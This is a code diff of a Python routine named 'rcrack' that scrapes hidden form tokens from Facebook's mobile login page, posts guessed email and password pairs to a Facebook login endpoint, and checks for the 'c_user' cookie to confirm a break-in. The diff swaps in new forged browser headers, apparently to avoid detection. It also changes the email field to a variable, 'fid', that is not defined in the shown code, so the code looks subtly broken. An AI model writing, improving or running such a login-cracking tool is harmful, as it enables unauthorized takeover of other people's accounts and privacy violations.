@@ -245,36 +245,45 @@ def rcrack(uid,pwx,tl):
             session = requests.Session()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
-            "email":uid,
+            "email":fid,
             "pass":ps,
             "login":"Log In"}
-#____((𝑼𝑷𝑫𝑨𝑻𝑬-𝑺𝒀𝑺𝑻𝑬𝑴-𝑩𝑶𝑺𝑺-𝑬𝑴𝑹𝑨𝑵))            
-            header_freefb = {
-            'authority': 'www.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method':'GET',
+            'scheme':'https',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v17.0',
+            'strict-transport-security': 'max-age=15552000; preload',
+            'pragma': 'no-cache',
+            'cache-control': 'private, no-cache, no-store, must-revalidate',
+            'x-fb-request-id': 'AFIDbHyt64aMLKXqlTrceYY',
+            'x-fb-trace-id': 'F9k/IXe6GPv',
+            'x-fb-rev': '1008157668',
+            'x-fb-debug': 'c931stKO1P8xAG5PRAjeJa7+zd11brUUxs/AXdx7muT1243P0/4pf4Y2KBU+opCEAh5nMFzYLRRuuG6Tte3mcQ==',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://web.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'dpr': '1',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.180", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.180"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-site',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': pro,
+            'viewport-width': '1125',}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
